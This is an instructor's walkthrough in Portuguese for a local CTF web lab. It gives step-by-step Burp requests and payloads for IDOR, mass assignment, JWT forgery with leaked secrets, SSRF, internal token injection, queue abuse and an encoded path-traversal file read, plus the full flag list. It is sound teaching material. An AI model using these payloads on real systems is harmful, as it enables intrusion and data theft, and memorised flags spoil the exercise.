# Lab 04 - SentinelCore - Walkthrough do Instrutor

Gabarito completo para instrutores do **Lab 04 - SentinelCore**.

## Escopo autorizado

```text
http://127.0.0.1:8094
```

Use este roteiro somente no ambiente local do lab. A aplicacao publica somente o `sentinel-app` no host. Os servicos `internal-admin`, `redis` e `worker` ficam na rede Docker interna e aparecem na cadeia porque a propria aplicacao consegue conversar com eles.

## Como subir o lab

Dentro do repositorio:

```bash
cd ~/ctf-labs/lab-04-sentinelcore
docker compose down --remove-orphans
docker compose up --build
```

Em outro terminal, se quiser deixar variaveis prontas para validacao tecnica:

```bash
BASE=http://127.0.0.1:8094
COOKIE=/tmp/lab04-sentinel.cookies
```

## Credenciais iniciais

```text
intern / intern2026
```

## Como usar este walkthrough

Este walkthrough prioriza navegador, DevTools e Burp. Os comandos curl aparecem somente no apendice de validacao rapida. A resolucao recomendada em aula e conduzir a exploracao manualmente: observar a interface, capturar requests, enviar para Repeater, alterar parametros, comparar respostas e correlacionar pistas.

Em cada etapa, primeiro demonstre o fluxo manual. Use o apendice final apenas para confirmar rapidamente que o ambiente esta consistente.

## Cadeia de exploracao

A cadeia esperada combina varias falhas pequenas. Nenhuma delas entrega o lab inteiro sozinha; o objetivo didatico e correlacionar pistas de objetos, roles, artefatos, rede interna e processamento assincrono.

1. Login como `intern`.
2. Reconhecimento pelo dashboard e pelo JavaScript publico.
3. BOLA/IDOR em detalhes de alertas.
4. Mass Assignment para alterar a role para `analyst`.
5. Debug disclosure.
6. Build artifact leak.
7. JWT forgery para admin.
8. Acesso admin.
9. SSRF para `internal-admin`.
10. Proxy com `x-internal-token`.
11. Template context disclosure.
12. Queue poisoning / worker abuse.
13. Leitura de output do worker.
14. Arbitrary file read final.

## 1. Login e reconhecimento inicial

### Objetivo da etapa

Entrar como usuario inicial, entender o dashboard e coletar os primeiros pontos de investigacao: cookie JWT, role atual, links basicos e bundle JavaScript publico.

### Onde ir

Abra no navegador:

```text
http://127.0.0.1:8094
```

Depois do login, use tambem:

```text
http://127.0.0.1:8094/dashboard
http://127.0.0.1:8094/api/v2/me
http://127.0.0.1:8094/api/v2/alerts
http://127.0.0.1:8094/static/js/sentinel.bundle.js
```

### O que observar

Na tela de login, confirme que a aplicacao aparece como **SentinelCore** e como uma console de Threat Operations / SOC. Use:

```text
intern / intern2026
```

No dashboard, observe:

- usuario `intern`;
- role inicial `viewer`;
- card **Fluxo de alertas**;
- card **Claims de identidade**;
- card **Telemetria do frontend**;
- nota operacional indicando que nem todo fluxo interno aparece no menu.

No DevTools, observe:

- em **Network**, requests para `/dashboard`, `/static/style.css` e `/static/js/sentinel.bundle.js`;
- em **Application** ou **Storage**, cookie `token` do dominio `http://127.0.0.1:8094`.

No Burp, observe o mesmo cookie no header:

```text
Cookie: token=...
```

### Como fazer manualmente

1. Abra `http://127.0.0.1:8094`.
2. Preencha `username` com `intern`.
3. Preencha `password` com `intern2026`.
4. Clique no botao de login.
5. No dashboard, clique em `/api/v2/me`.
6. Volte ao dashboard e clique em `/api/v2/alerts`.
7. Volte ao dashboard e clique em `/static/js/sentinel.bundle.js`.
8. Abra DevTools > Network.
9. Recarregue a pagina e confirme que o navegador carregou o HTML, o CSS e o bundle.
10. Abra DevTools > Application/Storage > Cookies e copie o valor do cookie `token`.
11. No Burp, capture uma request autenticada e envie para Repeater.

### Request esperada no Burp

Use esta request para confirmar a identidade atual:

```http
GET /api/v2/me HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=SEU_COOKIE
Accept: application/json
```

Use esta request para confirmar os alertas visiveis:

```http
GET /api/v2/alerts HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=SEU_COOKIE
Accept: application/json
```

### Resultado esperado

`/api/v2/me` deve retornar `username` como `intern` e `role` como `viewer`.

`/api/v2/alerts` deve retornar apenas alertas do usuario atual. Os IDs visiveis do `intern` sao:

```text
7412
7468
```

### Por que isso importa

Esta etapa estabelece a linha de base: quem e o usuario, qual role ele tem, quais objetos ele deveria ver e onde estao as pistas publicas. As proximas falhas dependem de comparar o comportamento esperado da interface com chamadas manuais na API.

### Problemas comuns

- Se o login voltar para a tela inicial, confira usuario e senha.
- Se `/dashboard` redirecionar para `/`, o cookie nao foi salvo.
- Se o Burp nao capturar requests, confira o proxy do navegador e o certificado do Burp.
- Se o cookie nao aparecer em DevTools, recarregue a pagina depois do login.

## 2. Inspecao do JavaScript publico

### Objetivo da etapa

Usar o bundle publico como fonte de reconhecimento. Ele nao entrega a solucao completa, mas revela superficie de API, formatos esperados e metadados operacionais que serao usados nas etapas seguintes.

### Onde ir

Abra:

```text
http://127.0.0.1:8094/static/js/sentinel.bundle.js
```

### O que observar

Procure o objeto:

```text
SentinelCore
```

Dentro dele, observe `routes` e anote:

- `me.path`: `/api/v2/me`;
- `alerts.path`: `/api/v2/alerts`;
- `alerts.detailShape`: `/api/v2/alerts/{incidentId}`;
- `alerts.incidentIdPattern`: `7xxx`;
- `alerts.detailHeaders`;
- `profile.path`: `/api/v2/me/profile`;
- `profile.expectedBody`;
- `debugHealth.minimumRole`: `analyst`;
- `buildManifest.minimumRole`: `analyst`;
- `integrationCheck.path`;
- `integrationProxy.path`;
- `reportRender.placeholders`;
- `jobs.knownTypes`;
- `jobOutput.path`;
- `diagnosticsRead.path`.

Os headers operacionais para detalhes de alerta aparecem como metadado de console:

```text
X-Sentinel-Client: web-console
X-Tenant-Scope: ACME-SOC
```

### Como fazer manualmente

1. Abra o bundle em uma aba nova.
2. Use a busca do navegador com `Ctrl+F`.
3. Procure por `SentinelCore`.
4. Procure por `detailShape`.
5. Procure por `detailHeaders`.
6. Procure por `expectedBody`.
7. Procure por `internal-admin`.
8. Copie as rotas para uma nota de aula ou para abas separadas no Burp Repeater.
9. Explique que isso e reconhecimento de superficie, nao uma lista de flags.

### Request esperada no Burp

O bundle tambem pode ser aberto pelo Burp:

```http
GET /static/js/sentinel.bundle.js HTTP/1.1
Host: 127.0.0.1:8094
Accept: */*
```

### Resultado esperado

O instrutor deve conseguir apontar no arquivo:

```text
detailShape: "/api/v2/alerts/{incidentId}"
incidentIdPattern: "7xxx"
detailHeaders: { ... }
expectedBody: { displayName, preferences, access }
```

### Por que isso importa

O lab e Hard porque exige correlacao. O bundle nao vaza o segredo completo nem a flag final, mas entrega a forma correta de conversar com a API. Isso justifica o uso de Burp Repeater e Intruder nas proximas etapas.

### Problemas comuns

- Se o aluno procurar apenas links no dashboard, vai perder rotas importantes.
- Se abrir detalhes de alerta direto pela barra do navegador, vai faltar contexto de headers.
- Se o bundle parecer grande, use busca por palavras como `alerts`, `profile`, `proxy`, `jobs` e `diagnostics`.

## 3. BOLA/IDOR em alertas

### Objetivo da etapa

Encontrar um alerta de outro owner explorando leitura direta de objeto por ID. A API exige headers fracos de console, mas nao valida corretamente se o alerta pertence ao usuario autenticado.

### Onde ir

Comece pela lista:

```text
http://127.0.0.1:8094/api/v2/alerts
```

Use o bundle para confirmar o formato:

```text
/api/v2/alerts/{incidentId}
```

Depois trabalhe no Burp Repeater ou Intruder.

### O que observar

Na lista, o `intern` ve apenas:

```text
7412
7468
```

No bundle, observe:

```text
incidentIdPattern: "7xxx"
X-Sentinel-Client: web-console
X-Tenant-Scope: ACME-SOC
```

Ao acessar um detalhe direto no navegador, sem headers operacionais, a API responde de forma generica:

```json
{
  "ok": false,
  "error": "alert unavailable"
}
```

### Como fazer manualmente

1. Abra `/api/v2/alerts` no navegador e anote os IDs visiveis.
2. Abra o bundle e confirme `detailShape`.
3. No navegador, tente acessar `/api/v2/alerts/7412`.
4. Mostre que a resposta sem headers nao traz o detalhe.
5. No Burp, envie a request para Repeater.
6. Adicione os headers `X-Sentinel-Client` e `X-Tenant-Scope`.
7. Reenvie `/api/v2/alerts/7412` e confirme que agora o detalhe retorna.
8. Troque apenas o numero do ID.
9. Para aula, configure Intruder no caminho `/api/v2/alerts/§7412§`.
10. Use uma faixa coerente com o padrao `7xxx`, por exemplo `7380` a `7480`. Essa faixa nao e chute absoluto: ela vem do padrao `7xxx` no bundle e dos IDs visiveis `7412` e `7468`.
11. Ordene os resultados por tamanho de resposta ou procure respostas com `ok: true` e objeto `alert`.
12. O ID correto do gabarito e `7391`.

### Request esperada no Burp

Primeiro, detalhe legitimo com headers:

```http
GET /api/v2/alerts/7412 HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=SEU_COOKIE
X-Sentinel-Client: web-console
X-Tenant-Scope: ACME-SOC
Accept: application/json
```

Depois, o ID vulneravel:

```http
GET /api/v2/alerts/7391 HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=SEU_COOKIE
X-Sentinel-Client: web-console
X-Tenant-Scope: ACME-SOC
Accept: application/json
```

### Resultado esperado

A resposta do ID `7391` deve conter um alerta de outro owner e a evidencia:

```text
flag{bola_alert_cross_tenant}
```

Tambem deve aparecer a pista:

```text
sentinelcore-dev-****
```

### Por que isso importa

A falha continua sendo BOLA/IDOR porque o servidor aceita o ID de um objeto que nao pertence ao usuario atual. Os headers apenas simulam contexto da console; eles nao substituem controle de acesso por objeto.

Esta pista leva para a etapa de debug, porque o alerta menciona material de autenticacao parcialmente exposto.

### Problemas comuns

- Se a resposta for `alert unavailable`, confira os dois headers operacionais.
- Se usar o navegador direto, os headers nao serao enviados.
- Se o Intruder mostrar muitas respostas iguais, filtre por tamanho ou por `ok":true`.
- Se receber 401, o cookie `token` esta ausente ou invalido.

## 4. Mass Assignment para analyst

### Objetivo da etapa

Elevar a role de `viewer` para `analyst` explorando um merge inseguro de JSON aninhado na atualizacao de perfil. O caminho direto `role=analyst` nao e mais o caminho esperado.

### Onde ir

Confirme a role atual:

```text
http://127.0.0.1:8094/api/v2/me
```

Use no Burp:

```text
PATCH /api/v2/me/profile
```

Volte ao bundle e observe:

```text
profile.expectedBody
access.requestedRole
```

### O que observar

Antes da exploracao, `/api/v2/me` deve mostrar:

```json
{
  "username": "intern",
  "role": "viewer"
}
```

No bundle, o corpo esperado de perfil inclui campos comuns e um objeto `access`:

```json
{
  "displayName": "Analyst Name",
  "preferences": {
    "density": "compact"
  },
  "access": {
    "requestedRole": "viewer"
  }
}
```

### Como fazer manualmente

1. Abra `/api/v2/me` e confirme `role: viewer`.
2. No Burp Repeater, monte um `PATCH /api/v2/me/profile`.
3. Primeiro envie um body normal com `displayName` e `preferences`.
4. Observe que a resposta apenas atualiza o perfil e mantem `effectiveRole` como `viewer`.
5. Tente o caminho ingenuo com campo de topo `role`.
6. Observe que `role` aparece como ignorado ou nao promove o usuario.
7. Se tentar `role: admin`, a aplicacao bloqueia explicitamente.
8. Volte ao formato do bundle e altere apenas `access.requestedRole` para `analyst`.
9. Envie o payload aninhado correto.
10. Copie o novo `Set-Cookie` da resposta.
11. Atualize o cookie no navegador ou mantenha a cookie jar do Burp atualizada.
12. Abra `/api/v2/me` novamente e confirme `role: analyst`.

### Request esperada no Burp

Body normal, sem elevacao:

```http
PATCH /api/v2/me/profile HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=SEU_COOKIE
Content-Type: application/json
Accept: application/json

{
  "displayName": "Intern Analyst",
  "preferences": {
    "density": "compact"
  }
}
```

Tentativa direta que nao e o caminho esperado:

```http
PATCH /api/v2/me/profile HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=SEU_COOKIE
Content-Type: application/json
Accept: application/json

{
  "displayName": "Intern Analyst",
  "preferences": {
    "density": "compact"
  },
  "role": "analyst"
}
```

Payload correto do gabarito:

```http
PATCH /api/v2/me/profile HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=SEU_COOKIE
Content-Type: application/json
Accept: application/json

{
  "displayName": "Intern Analyst",
  "preferences": {
    "density": "compact"
  },
  "access": {
    "requestedRole": "analyst"
  }
}
```

### Resultado esperado

A resposta do payload aninhado deve conter:

```text
flag{mass_assignment_analyst_role}
```

Tambem deve conter:

```text
effectiveRole: analyst
Set-Cookie: token=...
```

Depois disso, `/api/v2/me` deve retornar `role: analyst`.

### Por que isso importa

Esta etapa demonstra Mass Assignment em propriedade aninhada. A aplicacao bloqueia o campo obvio `role`, mas ainda confia em `access.requestedRole` durante o merge de perfil. A role `analyst` libera as rotas de debug e artefatos que sustentam a proxima parte da cadeia.

### Problemas comuns

- Se `/api/v2/me` ainda mostrar `viewer`, o cookie novo nao foi usado.
- Se receber 403 tentando `admin`, isso e esperado.
- Se receber erro de JSON, confira `Content-Type: application/json`.
- Se o Burp mantiver cookie antigo, substitua manualmente o valor de `token` pelo novo `Set-Cookie`.

## 5. Debug disclosure

### Objetivo da etapa

Usar a role `analyst` para acessar um endpoint de debug que expoe status interno, flag da etapa e fragmento de segredo.

### Onde ir

Abra com o cookie de `analyst`:

```text
http://127.0.0.1:8094/api/v2/debug/health
```

### O que observar

A rota exige `analyst` ou `admin`. A resposta deve mostrar:

- `service`;
- `build`;
- `diagnostic`;
- flag da etapa.

O campo importante e:

```text
Loaded auth secret: sentinelcore-dev-****
```

### Como fazer manualmente

1. Confirme em `/api/v2/me` que a role e `analyst`.
2. Abra `/api/v2/debug/health` no navegador.
3. Se preferir, repita no Burp com o cookie novo.
4. Compare com uma tentativa usando cookie antigo de `viewer`, se quiser demonstrar autorizacao.
5. Anote o fragmento de segredo e a flag.

### Request esperada no Burp

```http
GET /api/v2/debug/health HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=COOKIE_ANALYST
Accept: application/json
```

### Resultado esperado

```text
flag{debug_secret_fragment_disclosed}
sentinelcore-dev-****
```

### Por que isso importa

O debug nao entrega o segredo inteiro, mas confirma o formato do material de autenticacao. Isso prepara o aluno para reconhecer o segredo completo quando ele aparecer no artefato de build.

### Problemas comuns

- 403 significa role insuficiente ou cookie antigo.
- 401 significa cookie ausente ou invalido.
- Se ainda estiver como `viewer`, volte para a etapa de Mass Assignment e salve o novo cookie.

## 6. Build artifact leak

### Objetivo da etapa

Encontrar segredos completos preservados em um artefato antigo de build acessivel pela aplicacao.

### Onde ir

Abra com o cookie de `analyst`:

```text
http://127.0.0.1:8094/api/v2/artifacts/build-manifest
```

### O que observar

Procure a secao:

```text
removed_env
```

Dentro dela, identifique:

```text
JWT_SECRET
INTERNAL_ADMIN_TOKEN
```

Valores do gabarito:

```text
JWT_SECRET=sentinelcore-dev-2026
INTERNAL_ADMIN_TOKEN=internal-admin-token-7f3a9c21
```

### Como fazer manualmente

1. Abra `/api/v2/artifacts/build-manifest`.
2. Use busca na pagina por `removed_env`.
3. Localize `JWT_SECRET`.
4. Localize `INTERNAL_ADMIN_TOKEN`.
5. Anote os dois valores.
6. Explique que o primeiro permite assinar JWT admin.
7. Explique que o segundo sera usado depois contra o servico interno via proxy.

### Request esperada no Burp

```http
GET /api/v2/artifacts/build-manifest HTTP/1.1
Host: 127.0.0.1:8094
Cookie: token=COOKIE_ANALYST
Accept: application/json
```

### Resultado esperado

```text
flag{old_build_manifest_leaked_secrets}
JWT_SECRET=sentinelcore-dev-2026
INTERNAL_ADMIN_TOKEN=internal-admin-token-7f3a9c21
```

### Por que isso importa

Build artifacts antigos frequentemente parecem inofensivos, mas podem carregar variaveis removidas, tokens internos e detalhes de ambiente. Aqui eles conectam a etapa de debug com JWT forgery e abuso de trust boundary interno.

### Problemas comuns

- Se receber 403, confirme role `analyst`.
- Se nao encontrar `removed_env`, procure por `JWT_SECRET`.
- Nao use esses valores fora do lab local.

## 7. JWT forgery para admin

### Objetivo da etapa

Assinar um JWT admin usando o segredo vazado no build artifact e acessar uma rota que exige role `admin`.

### Onde ir

Use o cookie atual como referencia e teste a rota admin:

```text
http://127.0.0.1:8094/api/v2/admin/final
```

No Burp, trabalhe com:

```text
Authorization: Bearer <ADMIN_TOKEN>
```

### O que observar

O cookie `token` e um JWT. Ao decodificar, observe claims como:

```text
id
username
role
scope
```

O token legitimo do aluno tem role `viewer` ou `analyst`. O objetivo e gerar um token com:

```text
role: admin
scope: admin:read
```

### Como fazer manualmente

1. Copie o cookie `token`.
2. Decodifique no Burp Decoder ou em uma ferramenta local/offline.
3. Mostre que o JWT tem tres partes separadas por ponto.
4. Explique que o algoritmo usa segredo simetrico.
5. Use o `JWT_SECRET` vazado na etapa anterior para assinar um novo token.
6. Como assinar JWT manualmente no navegador nao e pratico, use o container da aplicacao como apoio tecnico.
7. Rode:

```bash
export ADMIN_TOKEN=$(docker exec lab04-sentinel-app node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({id:1,username:'intern',role:'admin',scope:['admin:read']}, 'sentinelcore-dev-2026'))")
```

8. Confira se a variavel contem um JWT real:

```bash
echo "$ADMIN_TOKEN"
```

9. O valor deve ter tres partes separadas por ponto.
10. No Burp Repeater, adicione `Authorization: Bearer <ADMIN_TOKEN>`.
11. Envie a request para `/api/v2/admin/final`.

### Request esperada no Burp

```http
GET /api/v2/admin/final HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Accept: application/json
```

### Resultado esperado

```text
flag{jwt_forged_admin_access}
```

A resposta tambem indica que a flag final esta em disco e precisa de uma primitiva de leitura.

### Por que isso importa

O segredo de assinatura vazado transforma uma falha de informacao em comprometimento de autenticacao. A partir daqui, o aluno consegue chamar rotas admin que conectam a aplicacao a servicos internos.

### Problemas comuns

- Se aparecer `"authentication required"`, o token nao foi enviado, esta vazio, expirou ou foi copiado errado.
- Se aparecer 403, o JWT foi aceito, mas a role nao e `admin`.
- Nao use literalmente `COLE_AQUI_O_TOKEN`.
- Rode `echo "$ADMIN_TOKEN"` antes de testar a rota admin.
- Se o token parecer vazio, gere novamente com `docker exec`.

## 8. SSRF para internal-admin

### Objetivo da etapa

Usar uma integracao admin para fazer a aplicacao principal acessar o servico interno `internal-admin`, que nao esta exposto no host.

### Onde ir

No bundle, observe:

```text
integrationCheck.path
/api/v2/integrations/check
```

No Burp Repeater, use:

```text
POST /api/v2/integrations/check
```

### O que observar

O servico interno atende pelo nome Docker:

```text
http://internal-admin:8081/status
```

`localhost` e `127.0.0.1` nao sao o caminho correto aqui: do ponto de vista da aplicacao, o alvo interno esta na rede Docker pelo service name.

### Como fazer manualmente

1. Abra uma aba nova no Burp Repeater.
2. Monte `POST /api/v2/integrations/check`.
3. Adicione `Authorization: Bearer <ADMIN_TOKEN>`.
4. Adicione `Content-Type: application/json`.
5. No body, envie a URL do `internal-admin`.
6. Envie a request.
7. Mostre que o browser nunca acessa o `internal-admin` diretamente; quem acessa e o servidor.

### Request esperada no Burp

```http
POST /api/v2/integrations/check HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
Accept: application/json

{
  "url": "http://internal-admin:8081/status"
}
```

### Resultado esperado

```text
flag{ssrf_reached_internal_admin}
```

### Por que isso importa

Esta etapa mostra SSRF controlado. O atacante nao acessa o servico interno pelo host, mas usa a aplicacao como ponte para a rede Docker interna.

### Problemas comuns

- Se usar `localhost`, a request nao representa o servico interno correto.
- Se receber 401, o header `Authorization` nao foi enviado.
- Se receber 403, o token nao tem role `admin`.
- Se o host `internal-admin` falhar, confira se os containers estao de pe.

## 9. Proxy com x-internal-token

### Objetivo da etapa

Usar o proxy admin para enviar headers controlados pelo cliente a um servico interno. O token interno vazado no build manifest quebra a fronteira de confianca entre cliente externo, aplicacao e `internal-admin`.

### Onde ir

No bundle, observe:

```text
integrationProxy.path
/api/v2/integrations/proxy
```

Use dois alvos internos:

```text
http://internal-admin:8081/internal/users
http://internal-admin:8081/internal/config
```

### O que observar

O header exigido pelo servico interno e:

```text
x-internal-token
```

O valor veio do build artifact:

```text
internal-admin-token-7f3a9c21
```

### Como fazer manualmente

1. Abra uma nova aba no Burp Repeater.
2. Monte `POST /api/v2/integrations/proxy`.
3. Use `Authorization: Bearer <ADMIN_TOKEN>`.
4. No JSON, coloque `url` apontando para `/internal/users`.
5. Em `headers`, inclua `x-internal-token`.
6. Envie e confirme a primeira flag.
7. Troque apenas a URL para `/internal/config`.
8. Envie novamente e confirme a segunda flag.

### Request esperada no Burp

Primeiro, usuarios internos:

```http
POST /api/v2/integrations/proxy HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
Accept: application/json

{
  "url": "http://internal-admin:8081/internal/users",
  "headers": {
    "x-internal-token": "internal-admin-token-7f3a9c21"
  }
}
```

Depois, configuracao interna:

```http
POST /api/v2/integrations/proxy HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
Accept: application/json

{
  "url": "http://internal-admin:8081/internal/config",
  "headers": {
    "x-internal-token": "internal-admin-token-7f3a9c21"
  }
}
```

### Resultado esperado

Para `/internal/users`:

```text
flag{internal_admin_token_accepted}
```

Para `/internal/config`:

```text
flag{internal_config_disclosed}
```

### Por que isso importa

O proxy permite que um cliente externo injete headers que deveriam existir apenas entre servicos internos. A configuracao interna tambem aponta para a fila e para os tipos de job usados na proxima etapa.

### Problemas comuns

- Se receber `forbidden`, confira o valor de `x-internal-token`.
- Se receber erro de auth na API principal, confira `Authorization: Bearer <ADMIN_TOKEN>`.
- Se a resposta vier vazia, confira se o JSON esta valido e se a URL esta em `internal-admin:8081`.

## 10. Template context disclosure

### Objetivo da etapa

Demonstrar vazamento de contexto em renderizacao de template. Esta etapa nao executa codigo; ela expoe valores internos permitidos no contexto do template.

### Onde ir

No bundle, observe:

```text
reportRender.path
/api/v2/reports/render
```

Tambem observe placeholders como:

```text
{{user.username}}
{{user.role}}
{{config.jwt_hint}}
{{config.internal_token_hint}}
```

### O que observar

A rota aceita `title` e `template`. O template substitui placeholders por valores do contexto da aplicacao.

### Como fazer manualmente

1. Abra uma nova aba no Burp Repeater.
2. Monte `POST /api/v2/reports/render`.
3. Use o token admin no header `Authorization`.
4. Envie um template simples primeiro, por exemplo `user={{user.username}}`.
5. Depois adicione `role`, `jwt_hint` e `internal_token_hint`.
6. Compare a resposta antes e depois.
7. Explique que a aplicacao deveria controlar melhor o que entra no contexto de template.

### Request esperada no Burp

```http
POST /api/v2/reports/render HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
Accept: application/json

{
  "title": "debug",
  "template": "user={{user.username}} role={{user.role}} secret={{config.jwt_hint}} internal={{config.internal_token_hint}}"
}
```

### Resultado esperado

```text
flag{template_context_leaked}
```

A resposta renderizada deve mostrar `intern`, `admin` e hints de configuracao.

### Por que isso importa

Mesmo sem RCE, templates podem vazar contexto sensivel. Aqui a etapa reforca a correlacao entre token, segredo parcial e token interno antes de chegar no worker.

### Problemas comuns

- Se os placeholders voltarem sem substituicao, confira a grafia com chaves duplas.
- Se receber 401 ou 403, confira o token admin.
- Nao apresente esta etapa como execucao remota de comandos; o lab nao implementa RCE real.

## 11. Queue poisoning / worker abuse

### Objetivo da etapa

Criar um job que sera processado por um worker interno via Redis e ler o output produzido em volume compartilhado.

### Onde ir

No bundle, observe:

```text
jobs.path
/api/v2/jobs
jobs.knownTypes
jobOutput.path
/api/v2/jobs/output?file={name}
```

No Burp, use:

```text
POST /api/v2/jobs
GET /api/v2/jobs/output?file=worker-token.txt
```

### O que observar

A configuracao interna apontou:

```text
queue: sentinel:jobs
knownTypes: report.export, token.debug
output: /shared
```

O tipo interessante para o gabarito e:

```text
token.debug
```

### Como fazer manualmente

1. Abra uma aba no Burp Repeater.
2. Monte `POST /api/v2/jobs`.
3. Use `Authorization: Bearer <ADMIN_TOKEN>`.
4. Envie um job do tipo `token.debug`.
5. Defina `output` como `worker-token.txt`.
6. Envie a request.
7. Aguarde alguns segundos para o worker processar a fila.
8. Abra no navegador ou no Repeater `/api/v2/jobs/output?file=worker-token.txt`.
9. Se o output nao aparecer, aguarde mais alguns segundos e veja os logs do worker.

### Request esperada no Burp

Criacao do job:

```http
POST /api/v2/jobs HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
Accept: application/json

{
  "type": "token.debug",
  "source": "manual",
  "output": "worker-token.txt"
}
```

Leitura do output:

```http
GET /api/v2/jobs/output?file=worker-token.txt HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Accept: text/plain
```

### Resultado esperado

```text
flag{worker_queue_poisoned}
WORKER_TOKEN
```

### Por que isso importa

O cliente externo nao fala com Redis nem com o worker diretamente. Mesmo assim, a aplicacao aceita jobs e expoe outputs do volume compartilhado. Isso transforma um fluxo interno assincrono em parte exploravel da cadeia.

### Problemas comuns

- Se o output nao existir, aguarde e tente novamente.
- Se continuar vazio, rode:

```bash
docker logs lab04-worker
```

- Se receber 403, confira o token admin.
- Se mudou o nome do arquivo no job, use o mesmo nome em `/api/v2/jobs/output?file=...`.

## 12. Leitura de output do worker

### Objetivo da etapa

Fechar a etapa de queue abuse explicando por que a leitura de output e perigosa e como ela ajuda a cadeia a avancar.

### Onde ir

Use:

```text
http://127.0.0.1:8094/api/v2/jobs/output?file=worker-token.txt
```

### O que observar

Observe que o output lido pela aplicacao veio de um volume compartilhado com o worker:

```text
/shared
```

### Como fazer manualmente

1. Abra a URL de output no navegador.
2. Confirme que o conteudo foi produzido pelo worker, nao pela aplicacao web diretamente.
3. Explique que o nome do arquivo vem do campo `output` enviado no job.
4. Compare com um job `report.export`, se quiser demonstrar um fluxo legitimo.
5. Mantenha claro que a leitura ocorre dentro do ambiente do lab.

### Request esperada no Burp

```http
GET /api/v2/jobs/output?file=worker-token.txt HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Accept: text/plain
```

### Resultado esperado

O aluno deve ver a mesma evidencia da etapa anterior:

```text
flag{worker_queue_poisoned}
```

### Por que isso importa

Esta etapa separa dois conceitos: enfileirar um job e ler o resultado. Em incident response real, outputs de workers e volumes compartilhados costumam ser esquecidos em revisoes de superficie.

### Problemas comuns

- Se usar outro nome de arquivo, ajuste o parametro `file`.
- Se o worker ainda nao processou, aguarde e confira `docker logs lab04-worker`.
- Se o token admin estiver ausente, a API pode negar a leitura.

## 13. Arbitrary file read final

### Objetivo da etapa

Usar uma leitura de diagnostico aparentemente limitada a logs para ler a flag final dentro do container da aplicacao, explorando bypass por encoding.

### Onde ir

Comece pela leitura normal:

```text
http://127.0.0.1:8094/api/v2/admin/diagnostics/read?file=app.log
```

Depois teste o bypass:

```text
http://127.0.0.1:8094/api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag
```

### O que observar

A funcionalidade parece ler apenas arquivos de log. O arquivo normal e:

```text
app.log
```

O traversal literal deve ser bloqueado:

```text
../secrets/final.flag
```

O bypass documentado usa `/` codificado:

```text
..%2fsecrets%2ffinal.flag
```

### Como fazer manualmente

1. No Burp Repeater, envie uma leitura normal de `app.log`.
2. Confirme que a resposta traz conteudo de log.
3. Troque o parametro `file` para `../secrets/final.flag`.
4. Mostre que a tentativa literal e bloqueada.
5. Troque apenas as barras por `%2f`.
6. Envie novamente.
7. Explique que o filtro verifica `../` antes do decode.
8. Explique que, depois do decode, o path resolvido escapa de `/app/logs` para `/app/secrets`.
9. Reforce que a leitura acontece dentro do container do lab, nao no host.

### Request esperada no Burp

Leitura normal:

```http
GET /api/v2/admin/diagnostics/read?file=app.log HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Accept: text/plain
```

Tentativa literal bloqueada:

```http
GET /api/v2/admin/diagnostics/read?file=../secrets/final.flag HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Accept: text/plain
```

Bypass final:

```http
GET /api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag HTTP/1.1
Host: 127.0.0.1:8094
Authorization: Bearer <ADMIN_TOKEN>
Accept: text/plain
```

### Resultado esperado

Flag final:

```text
flag{sentinelcore_full_chain_compromised}
```

### Por que isso importa

Esta etapa fecha a cadeia. O aluno precisou chegar a admin, entender a pista sobre arquivo em disco, encontrar uma primitiva de leitura e contornar uma validacao incompleta por ordem errada de decode.

### Problemas comuns

- Se receber 401, o token admin nao foi enviado.
- Se receber 403, o token nao e admin.
- Se receber bloqueio no traversal literal, isso e esperado.
- Se receber 404 no bypass, confira exatamente `..%2fsecrets%2ffinal.flag`.
- Nao use caminho absoluto do host; o lab le arquivos dentro do container.

## Lista de flags

```text
flag{bola_alert_cross_tenant}
flag{mass_assignment_analyst_role}
flag{debug_secret_fragment_disclosed}
flag{old_build_manifest_leaked_secrets}
flag{jwt_forged_admin_access}
flag{ssrf_reached_internal_admin}
flag{internal_admin_token_accepted}
flag{internal_config_disclosed}
flag{template_context_leaked}
flag{worker_queue_poisoned}
flag{sentinelcore_full_chain_compromised}
```

## Troubleshooting

- Porta ocupada: use `docker ps` para identificar containers ativos e rode `docker compose down` dentro de `lab-04-sentinelcore`.
- Login nao cria sessao: confira `intern / intern2026` e veja se a resposta tem `Set-Cookie`.
- Cookie antigo: se `/api/v2/me` continuar com `viewer`, o cookie novo da etapa de Mass Assignment nao foi salvo ou nao foi enviado.
- Role nao mudou: confira se o `PATCH /api/v2/me/profile` foi enviado com `Content-Type: application/json` e se a resposta trouxe novo `Set-Cookie`.
- BOLA retornando `alert unavailable`: adicione `X-Sentinel-Client: web-console` e `X-Tenant-Scope: ACME-SOC`.
- `authentication required`: token ausente, vazio, expirado, mal copiado ou nao enviado no header/cookie.
- 403 em rota admin: o JWT foi aceito, mas a role ou permissao nao e suficiente.
- Token admin vazio: rode `echo "$ADMIN_TOKEN"` e gere novamente com `docker exec`.
- Nao use literalmente `COLE_AQUI_O_TOKEN`.
- SSRF falhando: confirme que a URL usa `internal-admin:8081`, nao `localhost`.
- Proxy interno falhando: confirme o header `x-internal-token` com o valor vazado no build artifact.
